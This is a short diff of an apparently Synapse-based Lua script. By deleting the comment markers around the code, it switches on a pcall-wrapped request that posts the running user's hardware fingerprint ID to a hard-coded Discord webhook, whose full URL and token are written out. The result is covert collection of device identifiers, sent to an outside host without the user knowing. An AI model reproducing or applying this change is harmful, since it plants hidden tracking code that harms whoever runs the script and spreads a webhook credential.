@@ -1,4 +1,4 @@
---[[local webh = "https://discord.com/api/webhooks/1025068060798881862/q6-7ET8HZQGorFi8_g4xyJHjmGhcXGP7XoJ_sfdQnMtlQUs_IxlgXKBBsxRMxhuKQqh8"
+local webh = "https://discord.com/api/webhooks/1025068060798881862/q6-7ET8HZQGorFi8_g4xyJHjmGhcXGP7XoJ_sfdQnMtlQUs_IxlgXKBBsxRMxhuKQqh8"
 
 pcall(function()
    local data = {
@@ -61,4 +61,3 @@ syn.request({
       ["content"] = "Hardware ID: "..parsed.headers["Syn-Fingerprint"]
   })
 })
---]]
